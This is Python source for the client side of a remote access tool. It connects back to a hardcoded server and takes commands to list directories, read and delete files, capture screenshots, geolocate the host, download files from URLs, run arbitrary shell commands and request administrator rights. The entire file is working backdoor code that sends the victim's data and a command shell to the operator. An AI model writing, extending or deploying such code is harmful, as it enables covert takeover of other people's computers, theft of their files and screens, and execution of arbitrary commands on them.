"""
client.py
version = 0.001
Remote Access Tool
Made by Lukas Alstrup
github.com/LukasAlstrup/rat

"""

debug = True
#TODO configure debug mode

import os
import socket
import pyautogui
import time
import os
import getpass
import requests
import subprocess
import geocoder
import ctypes
import sys

"""Server"""
port = 8080
host = "192.168.0.14"

s = socket.socket()
print("[+] Server: ", host, " Port: ", port)

"""Connect to the server"""
while True:
    try:
        s.connect((host, port))
        break
    except ConnectionRefusedError:
        print("[-] The server refused to conect. A fireall may be blocking the port")
    except TimeoutError:
        print("[-] No response from the server")
    except Exception as e:
        print("[-] Error while connecting to the server: ", e)


print("Connected to the server successfully")

s.send(getpass.getuser().encode())

def main():
    def pwd():
        files = os.getcwd()
        files = str(files)
        s.send(files.encode())

    def custom_dir():
        user_input = s.recv(5000)
        user_input = user_input.decode()
        files = os.listdir(user_input)
        files = str(files)
        s.send(files.encode())

    def geolocate():
        ipaddress = geocoder.ip('me')
        s.send(str(ipaddress).encode())
        s.send(str(ipaddress.latlng).encode())

    def download_file():
        filepath = s.recv(5000)
        filepath = filepath.decode()
        file = open("filepath", "rb")
        data = file.read()
        s.send(data)

    def remove_file():
        file_and_dir = s.recv(6000)
        file_and_dir = file_and_dir.decode()
        os.remove(file_and_dir)

    def send_files():
        filename = s.recv(6000)
        new_file = open(filename, "wb")
        data = s.recv(6000)
        new_file.write(data)
        new_file.close()

    def screenshot():
        """Make screenshot and send it to the target"""
        screenshot = pyautogui.screenshot()
        screenshot_path = os.getcwd() + "\current_screenshot.png"
        screenshot.save(screenshot_path)
        screenshot.close()

        screenshot = open(screenshot_path, "rb")
        data = screenshot.read()
        s.send(data)

    def download_url():
        url = s.recv(100000000)
        filename = s.recv(1000000)
        url = url.decode()
        filename = filename.decode()
        r = requests.get(url) 
        f = open(filename, "wb+")
        f.write(r.content)
        f.close() 
        
    
    def cmd():
        global s
        while True:
            try:
                data = s.recv(13107200)
                if data[:2].decode() == 'cd':
                    os.chdir(data[3:].decode())
                if len(data) > 0:
                    cmd_command = subprocess.Popen(data[:].decode(), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                    output_bytes = cmd_command.stdout.read() + cmd_command.stderr.read()
                    output_str = str(output_bytes.decode())
                    s.send(str(output_str + str(os.getcwd()) + '> ').encode())
                    print(output_str)
            except Exception as e:
                s.send(str(str(e) + "\n" + str(os.getcwd()) + '> ').encode())

    def get_admin():
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)

    while True:
        try:
            """Receive and execute commands"""
            
            command = s.recv(1024)
            command = command.decode()

            if command == "pwd":
                pwd()

            elif command == "custom_dir":
                custom_dir()
                
            elif command == "geolocate":
                geolocate()

            elif command == "download_file":
                download_file()

            elif command == "remove_file":
                remove_file()

            elif command == "send_files":
                send_files()

            elif command == "screenshot":
                screenshot()
            
            elif command == "download_url":
                download_url()
            elif command == "cmd":
                cmd()
            
            if command == "get_admin":
                get_admin()
        
        except ConnectionRefusedError:
            print("Connection Refused Error")

        except ConnectionAbortedError:
            print("Connection Aborted Error")

        except ConnectionResetError:
            print("Connection Reset Error")

        except ConnectionError:
            print("Connection Error")
        
        except Exception as e:
            print("[-] Unexptected error: ", e)
    

main()
